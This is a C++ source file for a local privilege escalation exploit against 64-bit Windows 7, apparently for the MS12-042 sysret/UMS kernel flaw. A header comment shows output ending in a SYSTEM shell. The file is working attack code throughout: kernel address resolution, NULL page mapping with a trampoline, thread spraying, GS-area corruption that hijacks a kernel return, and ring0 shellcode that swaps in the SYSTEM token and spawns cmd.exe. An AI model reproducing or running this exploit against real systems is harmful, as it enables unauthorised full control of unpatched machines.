/*
	Tested on: Windows 7 Home Basic N Version 6.1 (Build 7601: Service pack 1)

	C:\Users\caco\Desktop>ms12-042.exe
	[+] NULL page allocated
	[+] PsGetCurrentProcess at 0xfffff800028eebb0
	[+] PsInitialSystemProcess at 0xfffff80002b0d030
	[+] PsReferencePrimaryToken at 0xfffff80002bb29d0
	[+] PsGetCurrentThread at 0xfffff80002929f40
	[+] ring0 code first bytes: 0x40ec8348e5894855...
	[+] Trampoline to ring0 code ready
	[+] Exploit TEB: 0x7fffffd9000
	[+] Thread Created: 0x110
	[+] Ums scheduler called with param: 0
	[+] Scheduling ums thread
	[+] Ums scheduler called with param: 1
	[+] === RSP: 0x22efb50 ======
	[+] Changing primary context
	[+] Scheduling ums thread
	Microsoft Windows [Version 6.1.7601]
	Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

	C:\Users\caco\Desktop>whoami
	nt authority\system

	C:\Users\caco\Desktop>
*/

#define _WIN32_WINNT 0x0601
#include <Windows.h>
#include "sysret.h"
#include <iostream>
#include <string>
#include <list>
#include <map>
#include <set>

PEPROCESS *PsInitialSystemProcess;
TPsGetCurrentProcess PsGetCurrentProcess;
TPsReferencePrimaryToken PsReferencePrimaryToken;
TPsGetCurrentThread PsGetCurrentThread;

PUMS_COMPLETION_LIST UmsCompletionList;
PUMS_CONTEXT lpUmsThread; // thread context - represents UMS worker thread

DWORD WINAPI ThreadSprayFunction(LPVOID lpParam);

class KernelResolver
{
	typedef enum _SYSTEM_INFORMATION_CLASS
	{
		SystemModuleInformation = 11,
	} SYSTEM_INFORMATION_CLASS;

	typedef struct _SYSTEM_MODULE
	{
		PVOID Section;
		PVOID MappedBase;
		PVOID ImageBase;
		DWORD ImageSize;
		DWORD Flags;
		WORD LoadOrderIndex;
		WORD InitOrderIndex;
		WORD LoadCount;
		WORD OffsetToFileName;
		BYTE FullPathName[256];
	} SYSTEM_MODULE, *PSYSTEM_MODULE;

	typedef struct _SYSTEM_MODULE_INFORMATION
	{
		ULONG ModulesCount;
		SYSTEM_MODULE Modules[0];
	} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

	typedef NTSTATUS (NTAPI *TNSI)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG,
			PULONG);

	std::map<std::string, PVOID> Resolved;

	void RKMImports(const char *module, PVOID base,
			std::list<const char *> names)
	{
		HMODULE hmod = LoadLibraryA(module);

		if (hmod)
		{
			std::list<const char*>::iterator i;

			for (i = names.begin(); i != names.end(); ++i)
			{
				ULONG_PTR addr = (ULONG_PTR) GetProcAddress(hmod, *i);

				if (addr)
				{
					addr -= (ULONG_PTR) hmod;
					addr += (ULONG_PTR) base;
					Resolved[*i] = (PVOID) addr;
				}
			}
		}
	}

public:

	KernelResolver(const char *module, std::list<const char *> names)
	{
		ULONG size = 0;
		TNSI NtQuerySystemInformation;
		HMODULE ntdll = GetModuleHandle("ntdll.dll");

		NtQuerySystemInformation = (TNSI) GetProcAddress(ntdll,
				"NtQuerySystemInformation");

		if (NtQuerySystemInformation(SystemModuleInformation, NULL, size,
				&size) == STATUS_INFO_LENGTH_MISMATCH)
		{
			char buff[size];
			PSYSTEM_MODULE_INFORMATION ModInfo =
					(PSYSTEM_MODULE_INFORMATION) &buff;

			if (NtQuerySystemInformation(SystemModuleInformation, ModInfo, size,
					&size) == STATUS_SUCCESS )
			{
				std::string modname;
				// resolve only nt names
				if (module == NULL)
				{
					modname = (char*) &ModInfo->Modules[0].FullPathName;
					modname = modname.substr(modname.rfind('\\') + 1);
					RKMImports(modname.c_str(), ModInfo->Modules[0].ImageBase,
							names);
				}
				else
				{
					do
					{
						ULONG i = --(ModInfo->ModulesCount);
						modname = std::string(
								(char*) &ModInfo->Modules[i].FullPathName);
						modname = modname.substr(modname.rfind('\\') + 1);

						if (modname.compare(module) == 0)
						{
							RKMImports(module, ModInfo->Modules[i].ImageBase,
									names);
							break;
						}

					} while (ModInfo->ModulesCount);
				}
			}
		}
	}

	PVOID GetAddress(std::string name)
	{
		return Resolved[name];
	}
};

class ThreadSpray
{
private:
	unsigned int TEBSize;
	unsigned int SpraySize;
	void (*Callback)();
	volatile bool Exploited;
	std::set<ULONG_PTR> TEBAddresses;
	CRITICAL_SECTION CriticalSection;
	HANDLE ReadyToExploit;

public:

	bool IsExploited(bool release = false)
	{
		WaitForSingleObject(ReadyToExploit, INFINITE);

		if (Exploited == true)
		{
			ReleaseMutex(ReadyToExploit);
			return true;
		}

		if (release == true)
			ReleaseMutex(ReadyToExploit);

		return false;
	}

	void SetExploited()
	{
		Exploited = true;
		ReleaseMutex(ReadyToExploit);
	}

	bool AddTEBAddress(ULONG_PTR addr)
	{
		if (IsExploited(true) == true)
			return false;

		EnterCriticalSection(&CriticalSection);
		TEBAddresses.insert(addr);
		LeaveCriticalSection(&CriticalSection);
		return true;
	}

	bool IsSuitableTEB(ULONG_PTR addr)
	{
		EnterCriticalSection(&CriticalSection);

		for (unsigned int x = TEBSize; x < SpraySize; x += TEBSize)
		{
			if (TEBAddresses.find(addr + TEBSize) == TEBAddresses.end())
			{
				LeaveCriticalSection(&CriticalSection);
				return false;
			}
		}

		LeaveCriticalSection(&CriticalSection);
		return true;
	}

	void ExploitCallback()
	{
		Callback();
	}

	void SprayAndExploit()
	{
		int threads = (SpraySize / TEBSize) * 16;
		HANDLE aThread[threads];

		for (int x = 0; x != threads; ++x)
			aThread[x] = CreateThread(NULL, 0, ThreadSprayFunction,
					(LPVOID) this, 0, NULL);

		WaitForMultipleObjects(threads, aThread, TRUE, INFINITE);

		for (int x = 0; x != threads; ++x)
			CloseHandle(aThread[x]);
	}

	ThreadSpray(void (*callback)(), unsigned int SpraySz) :
			TEBSize(0x2000), SpraySize(SpraySz + TEBSize), Callback(callback), Exploited(
					false)
	{
		InitializeCriticalSectionAndSpinCount(&CriticalSection, 0x00000400);
		ReadyToExploit = CreateMutex(NULL, FALSE, NULL);
	}

	~ThreadSpray()
	{
		DeleteCriticalSection(&CriticalSection);
		CloseHandle(ReadyToExploit);
	}
};

DWORD WINAPI ThreadSprayFunction(LPVOID lpParam)
{
	ULONG_PTR teb = (ULONG_PTR) NtCurrentTeb();
	ThreadSpray *_this = (ThreadSpray*) lpParam;

	if (_this->AddTEBAddress(teb) == false)
		return 0;
	/*
	 std::cout << "[+] tid: " << GetCurrentThreadId() <<
	 " -> TEB " << (void*)teb << std::endl;
	 */
	do
	{
		if (_this->IsExploited(true) == true)
			return 0;
	} while (_this->IsSuitableTEB(teb) != true);

	if (_this->IsExploited() != true)
	{
		std::cout << "[+] Exploit TEB: " << (void*) teb << std::endl;
		_this->ExploitCallback();
		_this->SetExploited();
	}

	return 0;
}

// Zombies wanna rule
DWORD _cdecl umsThread(LPVOID WINAPI lpThreadParameter)
{
	while (1)
		Sleep(2000);

	return 0;
}

VOID _cdecl UmsSchedulerProc(UMS_SCHEDULER_REASON Reason,
		ULONG_PTR ActivationPayload, PVOID SchedulerParam)
{
	PUMS_CONTEXT UmsThreadList;
	PUMS_CONTEXT next = lpUmsThread;

	std::cout << "[+] Ums scheduler called with param: "
			<< (unsigned long) Reason << std::endl;

	if (Reason != UmsSchedulerThreadYield)
	{
		DequeueUmsCompletionListItems(UmsCompletionList, 0, &UmsThreadList);

		if (UmsThreadList != NULL)
		{
			if ((next = (PUMS_CONTEXT) GetNextUmsListItem(UmsThreadList))
					!= NULL && Reason != UmsSchedulerStartup)
			{
				void *stack =
						(void*) ((PRTL_UMS_CONTEXT) lpUmsThread)->PrimaryUmsContext->Context.Rsp;
				char *gsArea = (char*) NtCurrentTeb();
				//ntoskrnl.exe:FFFFF800028D8C5F mov     rax, gs:qword_188
				//ntoskrnl.exe:FFFFF800028D8C68 bt      dword ptr [rax+4Ch], 0Bh
				*(void**) &gsArea[0x188] = (void*) gsArea; // avoid page fault
				/*
				 * KeQueryCurrentStackInformation:
				 ntoskrnl.exe:FFFFF800028C902A mov     rbp, gs:qword_188
				 ntoskrnl.exe:FFFFF800028C9033 mov     rax, gs:qword_1A8
				 ntoskrnl.exe:FFFFF800028C903C cmp     [rbp+28h], rax
				 ntoskrnl.exe:FFFFF800028C9040 jnz     loc_FFFFF800028F3C3F

				 this will end in a 0x8 write access.. avoid it taking the branch
				 */
				*(PVOID*) &gsArea[0x1A8] = NULL;
				*(PVOID*) &gsArea[0x28] = (PVOID) 0xffffffff; // take the branch

				/*
				 ntoskrnl.exe:FFFFF8000289C640 KeBugCheckEx:                           ; CODE XREF: ntoskrnl.exe:FFFFF800028E8023p
				 ntoskrnl.exe:FFFFF8000289C640                                         ; ntoskrnl.exe:FFFFF800028E81388p ...
				 ntoskrnl.exe:FFFFF8000289C640 mov     [rsp+8], rcx
				 ntoskrnl.exe:FFFFF8000289C645 mov     [rsp+10h], rdx
				 ntoskrnl.exe:FFFFF8000289C64A mov     [rsp+18h], r8
				 ntoskrnl.exe:FFFFF8000289C64F mov     [rsp+20h], r9
				 ntoskrnl.exe:FFFFF8000289C654 pushfq
				 ntoskrnl.exe:FFFFF8000289C655 sub     rsp, 30h
				 ntoskrnl.exe:FFFFF8000289C659 cli

				 ntoskrnl.exe:FFFFF8000289C65A mov     rcx, gs:qword_20
				 ntoskrnl.exe:FFFFF8000289C663 add     rcx, 120h
				 ntoskrnl.exe:FFFFF8000289C66A call    RtlCaptureContext

				 Setting gs:0x20 to the stack we can force RtlCaptureContext to smash it's own ret pointer
				 ...
				 ntoskrnl.exe:FFFFF8000289CD56 movaps  xmmword ptr [rcx+1A0h], xmm0
				 ntoskrnl.exe:FFFFF8000289CD5D movaps  xmmword ptr [rcx+1B0h], xmm1
				 ntoskrnl.exe:FFFFF8000289CD64 movaps  xmmword ptr [rcx+1C0h], xmm2
				 ntoskrnl.exe:FFFFF8000289CD6B movaps  xmmword ptr [rcx+1D0h], xmm3
				 ntoskrnl.exe:FFFFF8000289CD72 movaps  xmmword ptr [rcx+1E0h], xmm4
				 ntoskrnl.exe:FFFFF8000289CD79 movaps  xmmword ptr [rcx+1F0h], xmm5
				 ntoskrnl.exe:FFFFF8000289CD80 movaps  xmmword ptr [rcx+200h], xmm6
				 ntoskrnl.exe:FFFFF8000289CD87 movaps  xmmword ptr [rcx+210h], xmm7
				 ntoskrnl.exe:FFFFF8000289CD8E movaps  xmmword ptr [rcx+220h], xmm8
				 ntoskrnl.exe:FFFFF8000289CD96 movaps  xmmword ptr [rcx+230h], xmm9
				 ntoskrnl.exe:FFFFF8000289CD9E movaps  xmmword ptr [rcx+240h], xmm10
				 ntoskrnl.exe:FFFFF8000289CDA6 movaps  xmmword ptr [rcx+250h], xmm11
				 ntoskrnl.exe:FFFFF8000289CDAE movaps  xmmword ptr [rcx+260h], xmm12
				 ntoskrnl.exe:FFFFF8000289CDB6 movaps  xmmword ptr [rcx+270h], xmm13
				 ntoskrnl.exe:FFFFF8000289CDBE movaps  xmmword ptr [rcx+280h], xmm14
				 ntoskrnl.exe:FFFFF8000289CDC6 movaps  xmmword ptr [rcx+290h], xmm15
				 ntoskrnl.exe:FFFFF8000289CDCE stmxcsr dword ptr [rcx+34h]
				 ntoskrnl.exe:FFFFF8000289CDD2 mov     rax, [rsp+8]
				 ntoskrnl.exe:FFFFF8000289CDD7 mov     [rcx+0F8h], rax
				 ntoskrnl.exe:FFFFF8000289CDDE mov     eax, [rsp]
				 ntoskrnl.exe:FFFFF8000289CDE1 mov     [rcx+44h], eax
				 ntoskrnl.exe:FFFFF8000289CDE4 mov     dword ptr [rcx+30h], 10000Fh
				 ntoskrnl.exe:FFFFF8000289CDEB add     rsp, 8
				 ntoskrnl.exe:FFFFF8000289CDEF retn

				 Since SSE regs are 0 we can make ret -> NULL
				 NOTE: keep stack 16byte aligned for movaps instructions.

				 */
				*(PVOID*) &gsArea[0x20] = (void*) (((ULONG_PTR) stack - 0x1748)
						& ~0xf);

				std::cout << "[+] === RSP: " << stack << " ======" << std::endl;
				std::cout << "[+] Changing primary context" << std::endl;
				((PRTL_UMS_CONTEXT) lpUmsThread)->PrimaryUmsContext->Context.Rip =
						0x800000000000;
			}
		}
	}

	std::cout << "[+] Scheduling ums thread" << std::endl;
	Sleep(1000);
	ExecuteUmsThread(next);
}

void ExploitSysret()
{
	LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList = NULL;
	SIZE_T lpSize = 0;

	CreateUmsCompletionList(&UmsCompletionList);
	CreateUmsThreadContext(&lpUmsThread);
	InitializeProcThreadAttributeList(lpAttributeList, 1, 0, &lpSize);
	lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST) new char[lpSize];
	InitializeProcThreadAttributeList(lpAttributeList, 1, 0, &lpSize);

	UMS_SCHEDULER_STARTUP_INFO ussi;
	UMS_CREATE_THREAD_ATTRIBUTES createAttr;

	ussi.UmsVersion = UMS_VERSION;
	ussi.CompletionList = NULL;
	ussi.SchedulerProc = UmsSchedulerProc;
	ussi.SchedulerParam = NULL;
	ussi.CompletionList = UmsCompletionList;
	createAttr.UmsCompletionList = UmsCompletionList;
	createAttr.UmsContext = lpUmsThread;
	createAttr.UmsVersion = UMS_VERSION;

	UpdateProcThreadAttribute(lpAttributeList, 0,
			PROC_THREAD_ATTRIBUTE_UMS_THREAD, &createAttr, sizeof(createAttr),
			NULL, NULL);

	HANDLE hthread = CreateRemoteThreadEx(GetCurrentProcess(), NULL, 0,
			&umsThread, 0, 0, lpAttributeList, NULL);

	std::cout << "[+] Thread Created: " << hthread << std::endl;
	EnterUmsSchedulingMode(&ussi);
	Sleep(20000);
}

void _cdecl ring3code()
{
	system("cmd.exe");
}

void _cdecl ring0code()
{
	PEPROCESS curr;
	PACCESS_TOKEN systemToken, currToken;
	ULONG_PTR *currRaw;

	__asm("swapgs\n"::);

	curr = PsGetCurrentProcess();
	systemToken = PsReferencePrimaryToken(*PsInitialSystemProcess);
	currToken = PsReferencePrimaryToken(curr);
	currRaw = (ULONG_PTR *) curr;

	// search for token field in PEPROCESS
	while ((*currRaw & 0xfffffffffffffff0)
			!= ((ULONG_PTR) currToken & 0xfffffffffffffff0))
		++currRaw;

	*currRaw = (ULONG_PTR) systemToken & 0xfffffffffffffff0;

	__asm( "swapgs\n"
			"pushq $0x2b\n"
			"pushq %%rsp\n"
			"pushq $0x202\n"
			"pushq $0x33\n"
			"pushq %0\n"
			"movq $0, %%rax\n"
			"movq %%rax, %%cr8\n" // PASSIVE_LEVEL
			"iretq"
			:: "r" ((void*)ring3code));
}

int main()
{
	SIZE_T bufSize = 0x1000;
	LPVOID buf = (LPVOID) 1;
	DWORD flOldProtect;

	unsigned char trampoline[] =
	{ 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xE0 };

	const char *names[] =
	{ "PsInitialSystemProcess", "PsGetCurrentProcess",
			"PsReferencePrimaryToken", "PsGetCurrentThread", };

	ULONG_PTR ring0code_ptr = (ULONG_PTR) ring0code;
	ThreadSpray ts = ThreadSpray(ExploitSysret, 0x5000);
	KernelResolver kr(NULL,
			std::list<const char*>(names,
					names + sizeof(names) / sizeof(const char*)));
	HMODULE ntdll = LoadLibraryA("ntdll.dll");

	TNtAllocateVirtualMemory NtAllocateVirtualMemory =
			(TNtAllocateVirtualMemory) GetProcAddress(ntdll,
					"NtAllocateVirtualMemory");

	if (NtAllocateVirtualMemory == NULL)
	{
		std::cout << "[-] Can't resolve NtAllocateVirtualMemory" << std::endl;
		return -1;
	}

	if (NtAllocateVirtualMemory((HANDLE) -1, &buf, 0, &bufSize,
			MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE))
	{
		std::cout << "[-] Can't allocate NULL page" << std::endl;
		return -1;
	}

	std::cout << "[+] NULL page allocated" << std::endl;

	PsInitialSystemProcess = (PEPROCESS*) kr.GetAddress(
			"PsInitialSystemProcess");
	PsGetCurrentProcess = (TPsGetCurrentProcess) kr.GetAddress(
			"PsGetCurrentProcess");
	PsReferencePrimaryToken = (TPsReferencePrimaryToken) kr.GetAddress(
			"PsReferencePrimaryToken");
	PsGetCurrentThread = (TPsGetCurrentThread) kr.GetAddress(
			"PsGetCurrentThread");

	std::cout << "[+] PsGetCurrentProcess at " << (void*) PsGetCurrentProcess
			<< std::endl;
	std::cout << "[+] PsInitialSystemProcess at "
			<< (void*) PsInitialSystemProcess << std::endl;
	std::cout << "[+] PsReferencePrimaryToken at "
			<< (void*) PsReferencePrimaryToken << std::endl;
	std::cout << "[+] PsGetCurrentThread at " << (void*) PsGetCurrentThread
			<< std::endl;

	// Touch code pages to make sure they are in physical memory.
	std::cout << "[+] ring0 code first bytes: " << *(PVOID*) ring0code << "..."
			<< std::endl;

	CopyMemory(&trampoline[2], &ring0code_ptr, sizeof(ring0code_ptr));
	CopyMemory(NULL, trampoline, sizeof(trampoline));

	if (!VirtualProtect(NULL, 0x1000, PAGE_EXECUTE_READ, &flOldProtect))
	{
		std::cout << "[+] Error setting trampoline" << std::endl;
		return -1;
	}

	std::cout << "[+] Trampoline to ring0 code ready" << std::endl;
	ts.SprayAndExploit();
	return 0;
}


